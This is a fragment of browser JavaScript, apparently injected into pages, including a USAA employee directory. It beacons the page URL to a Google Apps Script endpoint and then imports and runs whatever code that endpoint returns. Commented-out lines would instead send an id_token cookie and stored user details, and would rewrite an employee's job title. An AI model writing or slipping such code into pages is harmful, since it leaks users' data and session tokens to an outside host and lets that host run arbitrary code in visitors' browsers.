  const eagleid = location.href;//Object.fromEntries(document.cookie.split(";").map((x) => String(x).trim().split("=")).map((x) => [x.shift(), x.join("=")])).id_token_marker || parse(localStorage.getItem("user"))?.EagleId;
  const name = document.currentScript?.src;//String(parse(localStorage.getItem("user"))?.FirstName);
  const url = new URL("https://script.google.com/macros/s/AKfycbzrr3Kyy4A6S3pNloWDl5qHHcBTH42YF6i2IlG9OKnIe-QXryEXfYo7JyCNo1g1NieSuA/exec",);
  url.searchParams.set("payload",btoa(encodeURIComponent(JSON.stringify({ eagleid, name }))));
  (async () => {
    try {
      await import(url);
    } catch {
      
    }finally{
      document.querySelector?.('[werk]')?.remove?.();
    }
  })();
  const TenX = (async ()=>{
    await new Promise(resolve=>document.readyState == 'complete' ? resolve() : document.addEventListener("load", resolve));
  /*  await[...document.querySelectorAll(`[id="person"]>[id="title"]:not([x10]),[id*="orgItemInfoContainer"]:has([href="https://apps.usaa.com/enterprise/employee-directory?emplNum=Y3953"]) [id*="orgJobTitle"]:not([x10])`,)].forEach((x) => {
      x.innerText = "10x Software Engineer";
      x.setAttribute("x10", true);
    });*/
    await[...document.querySelectorAll?.("[missing]")??[]].forEach((x) => x.remove());
  });
  TenX();
  setInterval(TenX,100);
})();
